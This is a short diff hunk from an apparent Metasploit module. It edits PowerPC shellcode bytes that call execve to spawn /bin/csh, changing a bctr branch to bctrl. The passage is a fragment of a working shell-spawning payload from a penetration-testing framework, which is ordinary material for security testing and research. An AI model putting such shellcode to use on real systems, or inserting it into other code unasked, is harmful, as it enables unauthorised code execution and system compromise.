@@ -95,7 +95,7 @@ module Metasploit3
 		"\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
 		@cal_execve +
 		"\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
-		"\x4e\x80\x04\x20"     +#   bctr                               #
+		"\x4e\x80\x04\x21"     +#   bctrl                              #
 		"/bin/csh"
 
 	end
